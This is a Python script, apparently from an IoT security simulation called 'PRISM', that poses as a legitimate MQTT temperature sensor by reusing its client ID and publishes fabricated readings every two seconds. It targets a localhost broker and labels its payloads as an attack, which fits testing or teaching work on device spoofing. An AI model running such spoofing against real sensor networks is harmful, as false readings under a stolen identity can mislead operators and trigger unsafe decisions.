import paho.mqtt.client as mqtt
import time
import json
import random
from datetime import datetime

# MQTT Broker settings
BROKER = "localhost"
PORT = 1883

# Spoofed device ID — pretending to be a legitimate sensor
SPOOFED_DEVICE = "sensor/temperature"

client = mqtt.Client(client_id="legitimate_sensor_01")  # Cloned device ID
client.connect(BROKER, PORT)
client.loop_start()

print("=" * 40)
print("PRISM ATTACK SIMULATION — Device Spoofing")
print(f"Impersonating: {SPOOFED_DEVICE}")
print("Publishing manipulated readings under stolen identity...")
print("=" * 40)

try:
    while True:
        # Publish manipulated readings pretending to be a real sensor
        fake_value = round(random.uniform(85, 100), 2)
        payload = json.dumps({
            "device": SPOOFED_DEVICE,
            "value": fake_value,
            "timestamp": datetime.now().isoformat(),
            "attack": "DeviceSpoofing",
            "spoofed_id": "legitimate_sensor_01"
        })

        client.publish(SPOOFED_DEVICE, payload)
        print(f"[{datetime.now().strftime('%H:%M:%S')}] SPOOFED {SPOOFED_DEVICE}: {fake_value}°C")

        time.sleep(2)

except KeyboardInterrupt:
    print("\nDevice Spoofing attack stopped.")
    client.loop_stop()
    client.disconnect()